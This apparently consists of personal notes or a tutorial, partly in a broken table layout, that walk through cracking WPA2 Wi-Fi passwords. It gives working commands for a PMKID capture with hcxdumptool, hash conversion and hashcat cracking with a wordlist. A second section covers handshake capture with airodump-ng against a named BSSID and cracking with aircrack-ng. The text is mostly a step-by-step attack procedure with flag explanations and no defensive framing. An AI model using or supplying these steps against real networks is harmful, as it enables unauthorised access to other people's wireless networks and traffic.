+------------------+---------------------------------------------------+
| ### Sc           | Use the built in NetworkManager CLI to detect     |
| an the network f | local access points:                              |
| or access points |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | nmcli -p dev wifi list                            |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | -p - organizes the output                         |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | dev - Specifies what device to select             |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | wifi - Specifies the wireless interface           |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | list - Lists the available access points          |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | Once the desired access point has been selected   |
|                  | log the network information for future use.       |
|                  |                                                   |
|                  |                                                   |
+==================+===================================================+
| ### Kill inter   | Check to see if any processes are interfering     |
| fering processes | with monitor mode:                                |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | sudo airmon-ng check kill                         |
|                  |                                                   |
|                  |                                                   |
+------------------+---------------------------------------------------+
| ### Cap          | Download and use hcxdumptool to extract the PMKID |
| turing the PMKID | from the AP. Fill in the AP\'s mac address in the |
|                  | filter list flag:\                                |
|                  | \                                                 |
|                  | sudo hcxdumptool -i wlan0 -o outcapture           |
|                  | \--enable_status=1                                |
|                  | \--filterlist_ap=\*\*.\*\*.\*\*.\*\*.\*\*.\*\*    |
|                  | \--filtermode=2 -c \*\                            |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | -i - Specifies the interface to use\              |
|                  |                                                   |
|                  |                                                   |
|                  | -o - Points to the output capture file            |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | \--enable_status=1 - Captures EAPOL frames to     |
|                  | capture the PMKID.                                |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | \--filterlist_ap - The BSSID for the AP           |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | \--filtermode=2 - Filter mode 2 only scans the    |
|                  | specified BSSID\                                  |
|                  |                                                   |
|                  |                                                   |
|                  | -c- The routers channel is set\                   |
|                  |                                                   |
+------------------+---------------------------------------------------+
| Converting the   | Use hcxpcapngtool to convert the capture file to  |
| PMKID capture    | a hash:\                                          |
| file to a hash   | \                                                 |
| format           | hcxpcapngtool -o hash.txt outcapture              |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | -o - Points to the output hash file               |
+------------------+---------------------------------------------------+
| Cracking the     | Use hashcat to crack the hash to obtain the       |
| hash             | password:\                                        |
|                  | \                                                 |
|                  | sudo hashcat -m 22000 hash.txt -a 0 -o            |
|                  | password.txt /usr/share/wordlists/rockyou.txt\    |
|                  | \                                                 |
|                  |                                                   |
|                  |                                                   |
|                  | -m - References the hash type (22000 is PMKID     |
|                  | EAPOL)                                            |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | -a - References attack mode                       |
|                  |                                                   |
|                  |                                                   |
|                  |                                                   |
|                  | -o - Points to the output text file\              |
|                  |                                                   |
+------------------+---------------------------------------------------+
| Looking at the   | sudo cat password.txt                             |
| password         |                                                   |
+------------------+---------------------------------------------------+

## 

 

Wpa2 Attack notes:

 

**Airodump-ng wlan0mon (Scan for networks)**

Explanation: This command initiates a wireless network scan to find
available networks. Airodump-ng is the tool used for packet capturing in
aircrack-ng suite, and wlan0mon is the monitor mode interface.

**Airodump-ng wlan0mon -w name.cap ---bssid 28:80:88:3C:23:C2 -c 10**

Explanation: This command is more specific and captures packets from a
targeted network. wlan0mon is again the monitor mode interface. The -w
name.cap specifies the file where the captured packets will be stored.
---bssid 28:80:88:3C:23:C2 targets a specific network with the given
BSSID (the MAC address of the Wi-Fi router). -c 10 indicates that the
tool should focus on channel 10.

Check on Wireshark to verify 4-way handshake

Explanation: This isn\'t a command per se but a step in the process.
After capturing the packets, you can open the .cap file in Wireshark to
inspect the packets. You are looking for EAPOL frames that indicate a
4-way handshake has occurred. This is essential for verifying that you
have the information needed for the next cracking step.

**Aircrack-ng name.cap**

Explanation: This command uses the aircrack-ng tool to attempt to crack
the captured WPA/WPA2 handshake. name.cap is the file where the captured
packets are stored. The tool will perform a brute-force or dictionary
attack to try and discover the Pre-Shared Key (PSK) for the network.
